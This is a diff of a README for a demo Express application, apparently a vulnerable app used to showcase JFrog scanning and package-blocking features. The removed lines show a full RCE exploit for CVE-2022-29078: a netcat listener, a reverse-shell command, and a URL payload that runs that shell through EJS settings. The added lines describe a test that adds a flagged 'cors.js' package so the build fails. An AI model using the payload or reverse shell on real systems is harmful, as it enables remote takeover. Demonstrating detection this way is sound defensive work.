@@ -3,60 +3,21 @@
 [![Scanned by Frogbot](https://raw.github.com/jfrog/frogbot/master/images/frogbot-badge.svg)](https://docs.jfrog-applications.jfrog.io/jfrog-applications/frogbot)
 
 ## Overview
-This a demo Express JS application to illustrate how a critical vulnerability can be exploited and how it could have been detected and remediated using [Jfrog Advanced Security](https://jfrog.com/advanced-security/) new features.
 
+This is a demo how to integrate JFrog Artifactory with GitHub. 
 
-   <img src="https://github.com/muldos/vuln-express/raw/master/images/home.png" alt="Home page overview" width="100%" style="margin: 20px;"/>
+Today we showcase
 
-## Build the project and the docker image
+- OICD integration - seemless integration of the JFrog plattform with GitHub actions.
+- Show results of security scans in the GitHub's build summaries.
+- Block malicious packages with JFrog Curation.
 
-Build the project
+#### - Showcase maliscious package detection, please add this line
 
-`npm install`
-
-Run it locally
-
-`npm start`
-
-Build the docker image
-
-`docker build . -t vuln-ejs:latest`
-
-Run it
-
-`docker run -p 3000:3000 vuln-ejs:latest`
-
-## Usage
-
-1 - With netcat start listening on a given host, on the port 1337 for example
-
-`nc -lv 1337`
-
-Then we will exploit CVE-2022-29078 RCE to create a remote shell by issuing the following command in the container
-
-```ncat host.docker.internal 1337 -e /bin/bash```
-
-Note : pay attention that the netcat command may differs between the host OS & the container's distro (in macosx is it `nc`, while in the container it is `ncat`)
-
-
-2 - To do that you will exploit the vulnerabilities using the following url 
-
-`http://localhost:3000/?id=David&settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync(%27ncat%20host.docker.internal%201337%20-e%20/bin/bash%27);s`
-
-Replace `host.docker.internal` if needed, to open your remote shell where your step 1 netcat processing is listening.
-
-![Exploit overview](/images/exploited.png)
-
-To trigger the exploit : 
-
-open a terminal and run 
-
-`nc -lv 1337`
-
-Then use the link in the application to open the web shell.
-
-3 - The showcase maliscious package detection, please add this line
+Usually there is already a brach named "malicious". If this branch is missing, create a new branch and add
 
 `    "cors.js": "0.0.1-security",`
 
-in the "dependencies" section.
+in the "dependencies" section of the `package.json`file.
+
+Try a GitHub Actions build afterwards for this branch. The build should fail and the build summary should explain, that a policy violation is causing the failure.
